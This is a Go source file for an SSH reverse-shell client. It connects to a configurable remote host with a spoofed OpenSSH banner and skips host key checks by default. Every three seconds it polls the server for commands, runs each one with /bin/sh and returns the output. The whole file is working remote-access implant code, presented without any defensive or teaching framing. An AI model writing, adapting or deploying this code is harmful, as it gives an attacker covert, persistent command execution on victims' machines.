package main

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/x509"
	"encoding/pem"
	"log"
	"os/exec"
	"os/user"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	Rshost       = "127.0.0.1"
	Rsport       = "2222"
	clientBanner = "SSH-2.0-OpenSSH_9.7"
	sshKey       = ``
	sshHostKey   = ``
)

func generateEd25519Key() (sshPriv ssh.Signer, err error) {
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return sshPriv, err
	}

	bytes, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		return sshPriv, err
	}

	privatePem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "PRIVATE KEY",
			Bytes: bytes,
		},
	)

	sshPriv, err = ssh.ParsePrivateKey(privatePem)
	if err != nil {
		return sshPriv, err
	}

	return sshPriv, nil
}

func parseKey(raw []byte) (ssh.Signer, error) {
	privatePem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "PRIVATE KEY",
			Bytes: raw,
		},
	)

	sshPriv, err := ssh.ParsePrivateKey(privatePem)
	if err != nil {
		return sshPriv, err
	}

	return sshPriv, nil
}

func main() {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}
	var signer ssh.Signer
	if sshKey != "" {
		signer, err = parseKey([]byte(sshKey))
		if err != nil {
			log.Fatal("Couldn't parse provided keys")
		}
	} else {
		signer, err = generateEd25519Key()
		if err != nil {
			log.Fatal("Couldn't generate keys")
		}
	}
	config := &ssh.ClientConfig{
		User:          user.Username,
		ClientVersion: clientBanner,
		Auth: []ssh.AuthMethod{
			// ssh.Password("yourpassword"),
			ssh.PublicKeys(signer),
		},
	}
	if sshHostKey == "" {
		config.HostKeyCallback = ssh.InsecureIgnoreHostKey()
	} else {
		sshHostPub, err := ssh.ParsePublicKey([]byte(sshHostKey))
		if err != nil {
			log.Fatal("Couldn't parse public keys")
		}
		config.HostKeyCallback = ssh.FixedHostKey(sshHostPub)
	}
	client, err := ssh.Dial("tcp", Rshost+":"+Rsport, config)
	if err != nil {
		log.Fatal("Failed to dial: ", err)
	}
	defer client.Close()

	for {
		session, err := client.NewSession()
		if err != nil {
			log.Fatal("Failed to create session: ", err)
		}
		defer session.Close()

		var b bytes.Buffer
		session.Stdout = &b
		if err := session.Run(``); err != nil {
			log.Fatal("Failed to run: " + err.Error())
		}
		time.Sleep(3 * time.Second)
		switch b.String() {
		case "":
		default:
			cmd := exec.Command("/bin/sh", "-c", b.String())
			out, _ := cmd.CombinedOutput()
			session, err := client.NewSession()
			if err != nil {
				log.Fatal("Failed to create session: ", err)
			}
			var b bytes.Buffer
			session.Stdout = &b
			if err := session.Run(string(out)); err != nil {
				log.Fatal("Failed to run: " + err.Error())
			}
			defer session.Close()

		}
	}
}
